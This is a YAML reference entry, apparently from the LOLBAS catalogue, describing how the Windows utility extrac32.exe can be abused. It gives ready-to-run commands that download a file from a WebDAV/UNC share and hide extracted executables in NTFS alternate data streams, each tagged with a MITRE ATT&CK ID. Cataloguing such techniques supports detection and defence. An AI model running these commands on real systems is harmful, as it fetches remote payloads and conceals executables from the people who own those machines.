---
name: Extrac32.exe
description: 
functions:
  download:
    - description: Copy the source file to the destination file and overwrite it.
      code: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file from UNC/WEBDav
  ads:
    - description: Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
      code: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Extract data from cab file and hide it in an alternate data stream.
    - description: Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
      code: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Extract data from cab file and hide it in an alternate data stream.
resources:
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
    - resource: https://twitter.com/egre55/status/985994639202283520
fullpath:
    - path: C:\Windows\System32\extrac32.exe
    - path: C:\Windows\SysWOW64\extrac32.exe
detection:
  - IOC: 
acknowledgement:
  - Person: egre55
    Handle: '@egre55'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
